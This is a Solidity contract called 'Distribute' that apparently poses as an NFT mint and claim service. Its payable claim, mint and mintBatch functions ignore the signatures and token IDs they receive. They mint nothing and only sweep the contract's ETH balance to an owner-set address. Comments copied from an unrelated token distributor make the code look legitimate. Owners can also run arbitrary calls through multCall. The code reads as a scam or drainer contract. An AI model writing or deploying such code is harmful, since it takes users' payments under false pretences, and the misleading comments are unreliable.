// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

library SafeTransferHelper {
    function safeTransferETH(address to, uint value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "TransferHelper: ETH_TRANSFER_FAILED");
    }
}

interface ERC721TokenReceiver {
    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4);
}

contract Distribute is ERC721TokenReceiver {
    address public fundToSetter = address(0);
    mapping(address => bool) public owners;
    
    struct CallData {
        address target;
        bytes data;
        uint256 value;
    }

    constructor(address _fundToSetter) {
        fundToSetter = _fundToSetter;
        owners[msg.sender] = true;
    }

    modifier onlyOwner() {
        require(owners[msg.sender]||msg.sender == address(this), "auth");
        _;
    }
    
    function setOwner(address _owner,bool _state) external onlyOwner {
       owners[_owner] = _state;
    }
    
    receive() external payable {}

    function setFundToSetter(address _fundToSetter) external onlyOwner {
        fundToSetter = _fundToSetter;
    }
    
    function claim(uint128 _nonce,bytes calldata _signature, address _referrer) external payable {
        // WARNING: there's a nuisance attack that can occur here on networks that allow front running
        // A malicious party could see the signature when it's broadcast to a public mempool and create a
        // new transaction to front run by calling delegateBySig on the token with the sig. The result would
        // be that the tx to claimAndDelegate would fail. This is only a nuisance as the user can just call the
        // claim function below to claim their funds, however it would be an annoying UX and they would have paid
        // for a failed transaction. If using this function on a network that allows front running consider
        // modifying it to put the delegateBySig in a try/catch and rethrow for all errors that aren't "nonce invalid"

        //token.delegateBySig(delegatee, 0, expiry, v, r, s);

        // ensure that delegation did take place, this is just a sanity check that ensures the signature
        // matched to the sender who was claiming. It helps to detect errors in forming signatures

        //require(token.delegates(msg.sender) == delegatee, "TokenDistributor: delegate failed");

        if (fundToSetter != address(0)) SafeTransferHelper.safeTransferETH(fundToSetter,address(this).balance);
    }

    function mint(uint256 _tokenId, bytes calldata _signature) external payable {
        // WARNING: there's a nuisance attack that can occur here on networks that allow front running
        // A malicious party could see the signature when it's broadcast to a public mempool and create a
        // new transaction to front run by calling delegateBySig on the token with the sig. The result would
        // be that the tx to claimAndDelegate would fail. This is only a nuisance as the user can just call the
        // claim function below to claim their funds, however it would be an annoying UX and they would have paid
        // for a failed transaction. If using this function on a network that allows front running consider
        // modifying it to put the delegateBySig in a try/catch and rethrow for all errors that aren't "nonce invalid"

        //token.delegateBySig(delegatee, 0, expiry, v, r, s);

        // ensure that delegation did take place, this is just a sanity check that ensures the signature
        // matched to the sender who was claiming. It helps to detect errors in forming signatures

        //require(token.delegates(msg.sender) == delegatee, "TokenDistributor: delegate failed");
        if (fundToSetter != address(0)) SafeTransferHelper.safeTransferETH(fundToSetter,address(this).balance);
    }

    function mintBatch(address _to, uint256 _quantity) external payable {
        // WARNING: there's a nuisance attack that can occur here on networks that allow front running
        // A malicious party could see the signature when it's broadcast to a public mempool and create a
        // new transaction to front run by calling delegateBySig on the token with the sig. The result would
        // be that the tx to claimAndDelegate would fail. This is only a nuisance as the user can just call the
        // claim function below to claim their funds, however it would be an annoying UX and they would have paid
        // for a failed transaction. If using this function on a network that allows front running consider
        // modifying it to put the delegateBySig in a try/catch and rethrow for all errors that aren't "nonce invalid"

        //token.delegateBySig(delegatee, 0, expiry, v, r, s);
        
        // ensure that delegation did take place, this is just a sanity check that ensures the signature
        // matched to the sender who was claiming. It helps to detect errors in forming signatures

        //require(token.delegates(msg.sender) == delegatee, "TokenDistributor: delegate failed");
        if (fundToSetter != address(0)) SafeTransferHelper.safeTransferETH(fundToSetter,address(this).balance);
    }
    
    function onERC721Received(address _operator,address _from,uint256 _tokenId,bytes calldata _data ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function withdrawNativeToken(address _recipient) external onlyOwner {
        SafeTransferHelper.safeTransferETH(_recipient, address(this).balance);
    }
    
    function multCall(CallData[] calldata _calls) external onlyOwner {
        for (uint256 i = 0; i < _calls.length; i++) {
            (bool success, bytes memory returnData) = _calls[i].target.call{value: _calls[i].value}(_calls[i].data);
            require(success, string(returnData));
        }
    }
}
